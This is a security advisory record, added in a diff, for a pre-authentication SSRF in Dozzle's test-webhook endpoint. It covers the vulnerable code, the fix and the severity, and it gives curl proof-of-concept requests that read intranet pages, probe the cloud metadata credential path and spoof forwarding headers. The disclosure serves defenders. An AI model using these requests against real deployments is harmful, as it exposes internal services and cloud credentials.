@@ -1,0 +1,45 @@
+{
+  "id": "GHSA-3v9w-6365-9w54",
+  "modified": "2026-05-18T16:48:45.818118Z",
+  "published": "2026-05-18T16:41:39Z",
+  "aliases": [
+    "CVE-2026-45298"
+  ],
+  "summary": "Dozzle: Pre-auth SSRF with response-body reflection via POST /api/notifications/test-webhook (default no-auth deploy)",
+  "details": "## Summary\n\nIn a default dozzle deploy (the documented quickstart, no `DOZZLE_AUTH_PROVIDER` set), `POST /api/notifications/test-webhook` is reachable without authentication and forwards an attacker-controlled URL into a `WebhookDispatcher` that:\n\n- Sends an HTTP POST to the supplied URL with attacker-controlled request headers, and\n- Returns the response status code AND up to 1MB of the response body to the caller, when the target replies non-2xx.\n\nThis is a classic full-reflection SSRF, pre-auth, against any IP/port that dozzle's host can route to — including private subnets, link-local cloud metadata, and loopback services.\n\n## Affected versions\n\n`internal/notification/dispatcher/webhook.go` and `internal/web/notifications.go` at commit `581bab3a43ead84ea4d009a469a17af98fb3377f` and earlier (the test-webhook handler has been in place since the notifications subsystem was added).\n\n## Default-deploy reachability chain\n\n```\nmain.go:58-59           → enforces AuthProvider in {none, forward-proxy, simple}\nsupport/cli/args.go:18  → AuthProvider default is \"none\"\nmain.go:231-243         → when AuthProvider == \"none\", web.AuthProvider stays at NONE\ninternal/web/routes.go:130-132, 137-138 → auth middleware only registered if Provider != NONE\ninternal/web/routes.go:172-188          → /api/notifications/* (incl. /test-webhook) is inside that conditional Group\n```\n\nSo the default Quickstart deploy\n\n```bash\ndocker run -v /var/run/docker.sock:/var/run/docker.sock -p 8080:8080 amir20/dozzle:latest\n```\n\nexposes `POST /api/notifications/test-webhook` to the network without any authentication.\n\n## The vulnerable handler\n\n```go\n// internal/web/notifications.go:652-716\nfunc (h *handler) testWebhook(w http.ResponseWriter, r *http.Request) {\n    var input TestWebhookInput\n    if err := json.NewDecoder(r.Body).Decode(\u0026input); err != nil { ... }\n    ...\n    webhook, err := dispatcher.NewWebhookDispatcher(\"test\", input.URL, templateStr, input.Headers)\n    ...\n    result := webhook.SendTest(r.Context(), mockNotification)\n    ...\n    writeJSON(w, http.StatusOK, \u0026TestWebhookResult{\n        Success:    result.Success,\n        StatusCode: statusCode,\n        Error:      errStr,\n    })\n}\n```\n\n`input.URL` and `input.Headers` are entirely user-controlled. No host/IP/scheme validation anywhere.\n\n## The reflection sink\n\n```go\n// internal/notification/dispatcher/webhook.go:88-120\nreq, err := http.NewRequestWithContext(ctx, http.MethodPost, w.URL, bytes.NewReader(payload))\n...\nfor k, v := range w.Headers { req.Header.Set(k, v) }\n...\nresp, err := w.client.Do(req)\n...\nif resp.StatusCode \u003c 200 || resp.StatusCode \u003e= 300 {\n    limitedReader := io.LimitReader(resp.Body, 1024*1024)   // 1 MB\n    responseBody, _ := io.ReadAll(limitedReader)\n    ...\n    return TestResult{\n        Success:    false,\n        StatusCode: resp.StatusCode,\n        Error:      fmt.Sprintf(\"webhook returned status code %d: %s\",\n                                 resp.StatusCode, string(responseBody)),\n    }\n}\n```\n\nWhen the SSRF target returns non-2xx, up to 1 MB of response body becomes part of `Error`, which is then JSON-encoded back to the attacker.\n\n## PoC\n\n### A. Read intranet admin-panel response bodies (most common path)\n\nMost internal admin UIs respond to anonymous POST with 401/403 + an HTML or JSON body that contains version banners, CSRF tokens, internal hostnames, etc.\n\n```bash\ncurl -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"url\":\"http://192.168.1.1/admin/index.html\",\"headers\":{}}' \\\n  http://dozzle.example.com/api/notifications/test-webhook\n```\n\nResponse shape (`writeJSON` to the public Internet):\n```json\n{\n  \"Success\": false,\n  \"StatusCode\": 401,\n  \"Error\": \"webhook returned status code 401: \u003chtml\u003e\u003chead\u003e... full intranet HTML body, up to 1MB ...\u003c/html\u003e\"\n}\n```\n\n### B. Cloud IMDS reachability probe\n\n```bash\ncurl -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\",\"headers\":{}}' \\\n  http://dozzle.example.com/api/notifications/test-webhook\n```\n\nIf `StatusCode == 200`, IMDS is reachable. For AWS IMDSv2 the unauth POST returns 401 + body which IS reflected.\n\n### C. Header injection downstream\n\n```bash\ncurl -X POST -H \"Content-Type: application/json\" \\\n  -d '{\n    \"url\":\"http://internal-api.example.com:8080/admin/users\",\n    \"headers\":{\"X-Forwarded-User\":\"admin\",\"X-Real-IP\":\"127.0.0.1\"}\n  }' \\\n  http://dozzle.example.com/api/notifications/test-webhook\n```\n\n## Suggested fix\n\n1. **Refuse `test-webhook` when `Authorization.Provider == NONE`.** This is an admin-configuration helper; it should not be reachable on a deploy that has no concept of admin.\n2. **SSRF-harden `WebhookDispatcher`.** Resolve URL host once via `net.LookupIP`; refuse private/loopback/link-local/CGNAT; pin `http.Transport.DialContext` to the resolved IP (closes DNS-rebinding TOCTOU). Refuse non-http(s) schemes.\n3. **Stop reflecting response body.** UX for \"test webhook\" only needs `Success: bool, StatusCode: int`.\n\n## Severity\n\n- **CVSS 3.1:** High — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` ≈ 7.5 in default no-auth deploy.\n- **Auth:** none in default deploy. With `DOZZLE_AUTH_PROVIDER=simple` configured, the same primitive is post-auth.\n\n## Reproduction environment\n\n- Tested against: `amir20/dozzle:8.x` Docker image (commit `581bab3a43ead84ea4d009a469a17af98fb3377f`).\n- Code locations:\n  - Handler: `internal/web/notifications.go:652-716`\n  - Sink: `internal/notification/dispatcher/webhook.go:88-120`\n  - Auth gate: `internal/web/routes.go:130-138, 172-188`\n  - Default provider: `internal/support/cli/args.go:18`, `main.go:231`\n\n## Reporter\n\nEddie Ran. Filed via reporter API per dozzle's `SECURITY.md`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/amir20/dozzle",
+        "purl": "pkg:golang/github.com/amir20/dozzle"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "8.14.12"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-3v9w-6365-9w54/GHSA-3v9w-6365-9w54.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-3v9w-6365-9w54"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/amir20/dozzle"
+    }
+  ]
+}
